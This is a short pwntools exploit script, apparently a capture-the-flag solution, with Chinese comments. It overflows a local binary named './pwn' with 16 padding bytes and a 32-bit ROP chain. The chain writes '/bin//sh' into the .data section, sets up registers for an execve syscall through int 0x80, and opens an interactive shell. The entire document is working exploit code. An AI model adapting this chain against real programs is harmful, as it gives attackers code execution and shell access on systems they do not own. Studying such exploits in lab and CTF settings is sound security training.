from pwn import *

p = process('./pwn')
elf = ELF('./pwn')

int_0x80 = 0x0806c943
pop_eax_ret = 0x080b8016

# 构造payload
payload = b'b'*16
payload += pack('<I', 0x0806ecda)  # pop edx ; ret
payload += pack('<I', 0x080ea060)  # @ .data
payload += pack('<I', 0x080b8016)  # pop eax ; ret
payload += b'/bin'
payload += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda)  # pop edx ; ret
payload += pack('<I', 0x080ea064)  # @ .data + 4
payload += pack('<I', 0x080b8016)  # pop eax ; ret
payload += b'//sh'
payload += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda)  # pop edx ; ret
payload += pack('<I', 0x080ea068)  # @ .data + 8
payload += pack('<I', 0x080492d3)  # xor eax, eax ; ret
payload += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9)  # pop ebx ; ret
payload += pack('<I', 0x080ea060)  # @ .data
payload += pack('<I', 0x080de769)  # pop ecx ; ret
payload += pack('<I', 0x080ea068)  # @ .data + 8
payload += pack('<I', 0x0806ecda)  # pop edx ; ret
payload += pack('<I', 0x080ea068)  # @ .data + 8
payload += pack('<I', 0x080492d3)  # xor eax, eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0807a66f)  # inc eax ; ret
payload += pack('<I', 0x0806c943)  # int 0x80

# 发送payload
p.sendline(payload)

# 进入交互模式与shell进行交互
p.interactive()

